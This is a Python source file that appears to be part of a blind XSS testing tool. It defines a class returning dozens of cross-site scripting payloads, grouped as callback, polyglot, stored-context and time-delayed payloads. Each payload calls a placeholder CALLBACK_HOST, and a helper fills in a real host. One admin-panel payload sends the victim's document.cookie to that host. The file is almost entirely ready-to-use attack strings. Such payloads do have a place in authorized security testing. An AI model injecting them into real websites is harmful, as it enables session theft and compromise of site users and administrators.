"""
Blind XSS payload collection
"""

class BlindXSSPayloads:
    """Blind XSS payload collection"""
    
    @staticmethod
    def get_callback_payloads():
        """Get payloads that trigger external callbacks"""
        return [
            # Image-based callbacks
            '<img src="//CALLBACK_HOST/xss?id=IMG_CALLBACK">',
            '<img src=x onerror="this.src=\'//CALLBACK_HOST/xss?id=IMG_ERROR\'">',
            '<img src="//CALLBACK_HOST/xss" onload="this.src=\'//CALLBACK_HOST/xss?loaded=1\'">',
            
            # Script-based callbacks
            '<script src="//CALLBACK_HOST/xss.js"></script>',
            '<script>fetch("//CALLBACK_HOST/xss?id=FETCH_CALLBACK")</script>',
            '<script>new Image().src="//CALLBACK_HOST/xss?id=SCRIPT_IMG"</script>',
            
            # Iframe-based callbacks
            '<iframe src="//CALLBACK_HOST/xss?id=IFRAME_CALLBACK"></iframe>',
            '<iframe src="//CALLBACK_HOST/xss" onload="fetch(\'//CALLBACK_HOST/xss?loaded=1\')"></iframe>',
            
            # Link-based callbacks (for stored XSS in admin panels)
            '<a href="//CALLBACK_HOST/xss?id=LINK_CALLBACK">Click me</a>',
            
            # CSS-based callbacks
            '<style>@import "//CALLBACK_HOST/xss.css";</style>',
            '<div style="background:url(//CALLBACK_HOST/xss?id=CSS_BG)"></div>',
            
            # Form-based callbacks
            '<form action="//CALLBACK_HOST/xss" method="post"><input type="submit" value="Submit"></form>',
            
            # Meta refresh callbacks
            '<meta http-equiv="refresh" content="0;url=//CALLBACK_HOST/xss?id=META_REFRESH">',
            
            # SVG-based callbacks
            '<svg onload="fetch(\'//CALLBACK_HOST/xss?id=SVG_CALLBACK\')"></svg>',
            '<svg><image href="//CALLBACK_HOST/xss?id=SVG_IMAGE"/></svg>',
            
            # Audio/Video callbacks
            '<audio src="//CALLBACK_HOST/xss.mp3" autoplay></audio>',
            '<video src="//CALLBACK_HOST/xss.mp4" autoplay></video>',
            
            # Object/Embed callbacks
            '<object data="//CALLBACK_HOST/xss?id=OBJECT_CALLBACK"></object>',
            '<embed src="//CALLBACK_HOST/xss?id=EMBED_CALLBACK">',
            
            # WebSocket callbacks (for modern browsers)
            '<script>new WebSocket("ws://CALLBACK_HOST/xss")</script>',
            
            # DNS-only callbacks (no HTTP)
            '<img src="//DNS_CALLBACK_HOST">',
            '<script>fetch("//DNS_CALLBACK_HOST")</script>'
        ]
    
    @staticmethod
    def get_polyglot_payloads():
        """Get polyglot payloads that work in multiple contexts"""
        return [
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload=fetch("//CALLBACK_HOST/xss?polyglot=1")>',
            '"><script>fetch("//CALLBACK_HOST/xss?polyglot=2")</script>',
            '\'-fetch("//CALLBACK_HOST/xss?polyglot=3")-\'',
            '</script><script>fetch("//CALLBACK_HOST/xss?polyglot=4")</script>',
            '"><img src=x onerror="fetch(\'//CALLBACK_HOST/xss?polyglot=5\')">',
            '\';fetch("//CALLBACK_HOST/xss?polyglot=6");//',
            '"><svg onload="fetch(\'//CALLBACK_HOST/xss?polyglot=7\')">',
            '\'><script>fetch("//CALLBACK_HOST/xss?polyglot=8")</script>',
            '</textarea><script>fetch("//CALLBACK_HOST/xss?polyglot=9")</script>',
            '</title><script>fetch("//CALLBACK_HOST/xss?polyglot=10")</script>'
        ]
    
    @staticmethod
    def get_stored_context_payloads():
        """Get payloads optimized for stored XSS contexts"""
        return [
            # Comment/message contexts
            'Great post! <img src=x onerror="fetch(\'//CALLBACK_HOST/xss?context=comment\')">',
            'Thanks for sharing <script>fetch("//CALLBACK_HOST/xss?context=message")</script>',
            
            # Profile/bio contexts
            '<img src="//CALLBACK_HOST/xss?context=profile" alt="Profile pic">',
            'My website: <a href="//CALLBACK_HOST/xss?context=bio">Click here</a>',
            
            # Name/title contexts
            '<script>fetch("//CALLBACK_HOST/xss?context=name")</script>',
            'John<img src=x onerror="fetch(\'//CALLBACK_HOST/xss?context=title\')">Doe',
            
            # URL/link contexts
            'http://example.com"><script>fetch("//CALLBACK_HOST/xss?context=url")</script>',
            'javascript:fetch("//CALLBACK_HOST/xss?context=javascript_url")',
            
            # Email contexts
            'user@domain.com<script>fetch("//CALLBACK_HOST/xss?context=email")</script>',
            
            # Search/query contexts
            'search<script>fetch("//CALLBACK_HOST/xss?context=search")</script>',
            
            # File upload contexts (filename)
            'file<script>fetch("//CALLBACK_HOST/xss?context=filename")</script>.txt',
            
            # Admin panel contexts
            '<img src=x onerror="fetch(\'//CALLBACK_HOST/xss?context=admin&user=\'+document.cookie)">',
            
            # Log contexts
            'Error: <script>fetch("//CALLBACK_HOST/xss?context=log")</script>',
            
            # Configuration contexts
            'config<script>fetch("//CALLBACK_HOST/xss?context=config")</script>'
        ]
    
    @staticmethod
    def get_time_delayed_payloads():
        """Get payloads that execute after a delay"""
        return [
            '<script>setTimeout(function(){fetch("//CALLBACK_HOST/xss?delayed=1")}, 5000)</script>',
            '<script>setInterval(function(){fetch("//CALLBACK_HOST/xss?interval=1")}, 10000)</script>',
            '<img src=x onerror="setTimeout(()=>fetch(\'//CALLBACK_HOST/xss?img_delayed=1\'), 3000)">',
            '<script>window.addEventListener("load", ()=>fetch("//CALLBACK_HOST/xss?onload=1"))</script>',
            '<script>document.addEventListener("DOMContentLoaded", ()=>fetch("//CALLBACK_HOST/xss?domready=1"))</script>'
        ]
    
    @staticmethod
    def get_all_payloads():
        """Get all blind XSS payloads"""
        all_payloads = []
        all_payloads.extend(BlindXSSPayloads.get_callback_payloads())
        all_payloads.extend(BlindXSSPayloads.get_polyglot_payloads())
        all_payloads.extend(BlindXSSPayloads.get_stored_context_payloads())
        all_payloads.extend(BlindXSSPayloads.get_time_delayed_payloads())
        return all_payloads
    
    @staticmethod
    def replace_callback_host(payload: str, callback_host: str) -> str:
        """Replace callback host placeholders in payload"""
        return payload.replace('CALLBACK_HOST', callback_host).replace('DNS_CALLBACK_HOST', callback_host)
